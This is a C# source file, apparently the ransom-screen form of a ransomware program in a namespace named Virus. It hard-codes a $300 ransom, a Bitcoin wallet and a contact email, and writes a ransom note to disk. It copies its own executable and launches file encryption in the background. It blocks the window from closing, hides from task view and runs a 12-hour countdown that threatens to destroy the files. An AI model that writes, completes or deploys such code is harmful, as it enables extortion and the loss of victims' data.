using System;
using System.Windows.Forms;
using static Virus.MyFuncs;
using static Virus.RegHelpers;
using static Virus.RSAencryption;
using static Virus.AESencryption;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Reflection;
using System.Collections.Generic;
using System.IO;

namespace Virus
{
    public partial class Form2 : Form
    {
        public static int _timetopay = 12;
        public static string _ransomAmount = "$300";
        public static string _safeEmail = "getyourprivkey@protonmail.com";
        public static string _bitcoinAddress = "16YzUQfVeZpKoSpPeTyUgBRmBdfg8ABHZp";
        public DateTime DateTimePlus12Hours;

        public Form2()
        {
            InitializeComponent();
            richTextBox1.Text = $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ ";
            textBox2.Text = _bitcoinAddress;
            label1.Text = $"Send {_ransomAmount} worth of bitcoin to the address below.";

            if (Application.ExecutablePath != decryptexe) 
            {
                var appBytes = File.ReadAllBytes(Application.ExecutablePath);
                File.WriteAllBytes(decryptexe,appBytes);
            }
            
            AESencryption._aesKey = GetAESkey();    //gets encrypted aes key if it exists.
            
            if (GetDestroyDate() == null)   //Not first time being run 
            {
                File.AppendAllText(encrypttxt, $"List of files encrypted.");
                File.AppendAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
                DeleteDestroyDate();
                SetDestroyDate(DateTime.Now.AddHours(_timetopay));
            }
            DateTimePlus12Hours = DateTime.Parse(GetDestroyDate());

        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                // turn on WS_EX_TOOLWINDOW style bit
                cp.ExStyle |= 0x80;
                return cp;
            }
        }   //Hide from task view

        private void Form2_Load(object sender, EventArgs e)
        {

            //dont go any further
            LimitUserAccess();
            new Task(() => { StartEncryption(); }).Start();
            timer1.Start();
            System.Windows.Forms.ToolTip TP = new System.Windows.Forms.ToolTip();
            TP.ShowAlways = true;
            TP.SetToolTip(textBox1, "Enter Decryption Key Here.");
        }

        private void button2_Click(object sender, EventArgs e)//btc wallet address
        {
            Clipboard.SetText(textBox2.Text);
        }

        private void button1_Click(object sender, EventArgs e)  //decrypt click
        {
            DialogResult dialogResult = MessageBox.Show($"You have 1 attempt. If you use the wrong decryption code you will destroy all encrypted files. No matter how much money you offer they will be unrecoverable. Are You Sure You Want To Continue?", "Are You Sure?", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                //new Task(() => { StartDecryption(textBox1.Text); }).Start();   //async
                try
                {
                    StartDecryption(textBox1.Text);
                }
                catch {
                    MessageBox.Show("Decryption unsuccessful. We gave you a chance...");
                }

                File.Delete(decryptexe);
                File.Delete(instructionstxt);
                timer1.Stop();
                EndRoutine();
                CloseApp();
            }
            
        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            int i = 0;
            
            if (DateTime.Now >= DateTimePlus12Hours && i > 3)
            {
                timer1.Stop();
                MessageBox.Show("You didn't pay in time.", "Sorry!");
                //TODO end app and leave files encrypted
                i++;

            }
            if (DateTime.Now <= DateTimePlus12Hours)
            {
                // Display the new time left
                TimeSpan span = (DateTimePlus12Hours - DateTime.Now);
                var timeLeft = String.Format("{0} days, {1} hours, {2} minutes, {3} seconds", span.Days, span.Hours, span.Minutes, span.Seconds);
                timeLabel.Text = $"All files will be destroyed in  {timeLeft.ToString()}.";

            }
        }

        
    }
}